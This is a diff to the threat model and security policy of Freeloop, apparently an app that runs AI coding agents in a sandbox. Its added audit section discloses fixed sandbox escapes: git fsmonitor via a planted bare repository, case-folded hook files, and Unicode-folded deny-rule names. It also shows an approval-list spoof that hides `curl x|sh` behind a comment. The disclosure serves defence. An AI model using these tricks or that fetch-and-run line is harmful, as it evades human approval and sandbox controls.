@@ -4,7 +4,7 @@ Threat model and security policy for **Freeloop**. This document satisfies NFR-S
 
 ## Reporting a vulnerability
 
-Until the first public release, open a private security advisory on the GitHub repository. Before the MVP ships this section will name a contact address and a response target.
+Open a private security advisory on the GitHub repository, not a public issue. No person or address is named here, and no response time is promised: this is a project without a security team.
 
 ## What the app is
 
@@ -57,7 +57,7 @@ Out of scope: an attacker with root or kernel access, physical access to an unlo
 | 10 | A process with the user's privileges edits `rules.yaml` | Policy bypass | Config directory is write-protected from tools (SEC-005) and `0600`; no stronger defence against A4 |
 | 11 | Bypass mode on a hostile repo | Everything in rows 1 to 3 at once | Opt-in in settings, persistent banner, resets per session, unavailable in untrusted projects (SEC-001) |
 | 12 | Runaway loop burns API credit | Financial | Max turns and tokens per session (HRN-002); per-provider concurrency cap; cost display (PRV-008) |
-| 13 | A compromised dependency of Freeloop itself | Everything | Modules and npm packages pinned by checksum, CI's actions by commit, a budget for shipped npm packages (a test holds these); an SBOM with each release and builds anyone can reproduce (`make verify-repro`); minimal npm surface. Signed and notarized builds (SEC-012) wait on OQ-009, and until then a download is only as good as where it came from |
+| 13 | A compromised dependency of Freeloop itself | Everything | Modules and npm packages pinned by checksum, CI's actions by commit, a budget for shipped npm packages (a test holds these); an SBOM with each release and builds anyone can reproduce (`make verify-repro`); minimal npm surface. Builds are not signed or notarized (OQ-009), so a download is only as good as where it came from |
 | 14 | The app leaks vendor sign-in tokens | Legal exposure and account compromise | The app never reads, stores or forwards them; vendor binaries own their login (HRN-008) |
 | 15 | An MCP server's input request asks for a password or a key, or links to a phishing page | Credential theft | The form always asks the user, in every mode and whatever the rules (MCP-008); it names the server, shows its message and any link in full as plain text, and never fills itself in; the answers go only to the server that asked and are not written to the transcript |
 | 16 | A remote MCP server's OAuth metadata points at a service on the user's network, or its sign-in page is a `file:` or app URL | Requests from the app to internal services; a local file or app opened | The sign-in's requests refuse private and loopback addresses unless the server itself is on one; only `https` (or loopback `http`) sign-in pages open, and only after the user chose "Sign in…" (MCP-006) |
@@ -226,6 +226,19 @@ Checked in the running app on scratch data with a crafted backup of 38 items, wh
 "Approve all" is there for a large backup from the user's own other Mac, whose marks do not carry over: 37 items would otherwise be 37 clicks. It asks first, saying how many of what. It approves what the card showed and names it, so what arrived since keeps waiting, and if any of it changed it approves nothing and the card shows what is there now. Like the single approval it is not on the socket: the user approves, not another process. It does make approving a planted backup one click and a question, against 37 reads, which the question says plainly. The preview before the restore is where such a backup should be stopped.
 
 Not covered: `systemPrompt` in a profile can tell the model anything, though whatever it does then still goes through the broker. A profile's slash commands are prepared prompts the user sends. The real Keychain and the native file dialog were not part of the run: that build has no dialogs, and it kept secrets in memory. Docker tests skip here, with no daemon.
+
+### Production readiness, 2026-11-03
+
+An independent re-check of the 2026-11-02 review at 3348cce reproduced these, each fixed and re-run against the same proofs:
+
+- **A repository built in the project.** With only `.git/HEAD` moved aside, a sandboxed command could make the project root a bare repository to git, whose `core.fsmonitor` the user's own `git status` then ran outside the sandbox. Git has to be able to replace `.git/HEAD`, so a file named HEAD is now closed everywhere in the project but inside `.git`, in any case, since APFS opens `head` as `HEAD`. A project with its own file named HEAD cannot have it written by a sandboxed command. The regular expressions in a Seatbelt profile do not read `[^./]` as those two characters, which a test caught; use one character per bracket.
+- **A merge in another spelling.** A worktree session could commit `.FREELOOP/hooks.yaml`, which the merge check did not see and APFS then opened as `.freeloop/hooks.yaml`, and its hook ran unconfined. The check now folds names and looks at every level, and Discard refuses to restore such a file for a confined session, since that too writes what the session committed outside its sandbox.
+- **A socket moved in.** `/private/tmp` was writable, and a socket there could be moved into the project, where sockets are allowed. Sandboxed commands no longer write `/private/tmp`, and use their own `TMPDIR`. A tool that insists on `/tmp` is refused, which the sandbox note to the model covers.
+- **Names APFS folds that the check did not.** `paßwords.txt` passed a deny rule on `passwords.txt` and `~/.ßh` was not the never-readable `~/.ssh`, with ligatures likewise. `FoldPath` now folds fully.
+- **What an approval showed.** A newline read as a space on the approval list and the attention view, so `echo ok #` then `curl x|sh` on the next line looked like a comment (read, not rendered). Line breaks and control or invisible characters now show as what they are there, in a tool's title and on the command line.
+- **Smaller ones.** A planted `.git` file could open another repository to the sandbox or a container; saving a provider moved its key to an address a file had planted; `http.proxy` or `pushurl` in a repository's config received the app's push; relinking a project kept its trust; a variable holding a key under an innocent name, and `NODE_OPTIONS`, reached sandboxed commands; `~/.cargo/credentials.toml` was readable in the sandbox; the approvals list and the socket showed a secret the transcript redacts. The sandbox's `GIT_AUTHOR_*` overrode a repository's own name, and is now a config file of its own.
+
+Still open, all needing more than a click or a planted file: `FREELOOP_HOME` and `FREELOOP_DEV` work in a release build; a hook arriving after a project is trusted runs unprompted, with the merge check as what stands in its way; the file tools have a small race on creating folders (one win in 8,543 tries).
 
 ## Review cadence
 
